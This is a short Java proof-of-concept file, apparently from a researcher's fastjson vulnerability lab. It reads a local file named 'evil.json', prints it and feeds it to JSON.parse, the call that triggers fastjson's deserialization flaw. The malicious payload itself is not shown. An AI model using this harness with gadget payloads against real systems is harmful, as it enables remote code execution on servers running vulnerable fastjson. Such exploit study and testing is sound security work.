import com.alibaba.fastjson.JSON;
import org.apache.commons.io.IOUtils;
import org.apache.commons.codec.binary.Base64;
import java.io.*;

public class poc {
    public static void main(String args[]) throws Exception{
        StringBuffer Buffer = new StringBuffer();
        App.readToBuffer(Buffer, "/Users/m0rk/vul/fastjson/src/evil.json");
        System.out.println(Buffer.toString());
        JSON.parse(Buffer.toString());


    }
}